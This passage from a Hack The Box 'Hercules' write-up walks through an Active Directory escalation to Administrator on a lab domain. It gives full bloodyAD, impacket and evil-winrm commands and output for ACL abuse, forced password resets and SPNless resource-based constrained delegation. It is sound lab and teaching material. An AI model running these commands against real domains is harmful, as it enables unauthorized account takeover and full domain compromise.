Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': HTB{REDACTED_HASH}
```

We have the ticket for `ashley.b` now.
## ashley.b to iis_administrator$

Collect again:

![Pasted image 20251022161356.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251022161356.png)

We are in the `IT Support` group, we can use `auditor` to grant this group `GenericAll` on `Forest Migration OU`

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/user/auditor.ccache

─$ bloodyAD -d hercules.htb --host "dc.hercules.htb" -k --dc-ip 10.10.11.91 --dns 10.10.11.91 add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" "IT Support"

[+] IT Support has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Now we use `ashley.b` to view and trigger the scheduled task so `adminCount`  is removed from `iis_administrator$`:

```bash
─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/root/ashley.b.ccache  

─$ python3 ../user/winrmexec/evil_winrmexec.py hercules.htb/auditor@dc.hercules.htb -k -no-pass -ssl -port 5986 

PS C:\Users\ashley.b\Desktop> type test.ps1

PS C:\Users\ashley.b\Desktop> Get-ScheduledTask -TaskName "Password Cleanup"

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              Password Cleanup                  Ready

# Run
PS C:\Users\ashley.b\Desktop> Start-ScheduledTask -TaskName "Password Cleanup"

```

Regrant `auditor` rights on OU and enable `iis_administrator` then change his password:

```bash
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/user/auditor.ccache 

└─$ bloodyAD -d hercules.htb --host "dc.hercules.htb" -k --dc-ip 10.10.11.91 --dns 10.10.11.91 add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor     
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

PS C:\Users\auditor\Documents> Get-ADUser -Identity "iis_administrator" -Properties Enabled, MemberOf


DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
MemberOf          : {CN=Service Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb}
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb

PS C:\Users\auditor\Documents> Set-ADUser -Identity "iis_administrator" -Enabled $true

Set-ADAccountPassword -Identity "iis_administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -Reset
```

Request a `TGT`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ impacket-getTGT hercules.htb/'iis_administrator':'NewPassword123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_administrator.ccache
```

We have a ticket for `iis_administrator`
## iis_administrator to iis_webserver$

As `iis_administrator` now we are members of `SERVICE OPERATORS` and we have `ForceChangePassword` so we can reset `iis_webserver` password:

![Pasted image 20251022165425.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251022165425.png)

Change password with `BloodyAD`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ bloodyAD -d hercules.htb --host "dc.hercules.htb" -k --dc-ip 10.10.11.91 --dns 10.10.11.91 -u 'iis_administrator' -p 'NewPassword123!' set password iis_webserver$ 'Hacker123!' 
[+] Password changed successfully!
```

Request `TGT` for the user:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ impacket-getTGT hercules.htb/'iis_webserver':'Hacker123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver.ccache
```

And we have a ticket for `iis_webserver$`.
## iis_webserver to Administrator

Check:

![Pasted image 20251022185209.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251022185209.png)

We have a clear path for [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to `Administrator`.
### SPNless RBCD

https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd

**Step 1**: Obtain a TGT through overpass-the-hash to use RC4

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ getTGT.py -hashes :$(pypykatz crypto nt 'Hacker123!') 'hercules.htb'/'iis_webserver'
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver.ccache
```

**Step 2**: Obtain the TGT session key

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ describeTicket.py iis_webserver.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : d71f4acc35c61933dea8448f7b2caf21
```

**Step 3**: Change the controlledaccountwithoutSPN's NT hash with the TGT session key

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ changepasswd.py -newhashes :d71f4acc35c61933dea8448f7b2caf21 'hercules.htb'/'iis_webserver$':'Hacker123!'@'dc.hercules.htb' -k
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\iis_webserver$
[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
[-] CCache file is not found. Skipping...
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

**Step 4**: Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ KRB5CCNAME='iis_webserver.ccache' getST.py -u2u -impersonate "Administrator" -spn "HOST/dc.hercules.htb" -k -no-pass 'hercules.htb'/'iis_webserver'
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HOST_dc.hercules.htb@HERCULES.HTB.ccache
```

**Step 5**: The final service ticket can be used with [Pass-the-ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) on `evil_winrmexec.py`

```bash
─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/root/Administrator@HOST_dc.hercules.htb@HERCULES.HTB.ccache 
─$ python3 ../user/winrmexec/evil_winrmexec.py hercules.htb/Administrator@dc.hercules.htb -k -no-pass -ssl -port 5986

PS C:\Users\Admin> cd Desktop
PS C:\Users\Admin\Desktop> ls


    Directory: C:\Users\Admin\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/23/2025   3:02 AM             34 root.txt                                                              


PS C:\Users\Admin\Desktop> type root.txt
   HTB{REDACTED_FLAG}
```

Pwned !! Really INSANE box.
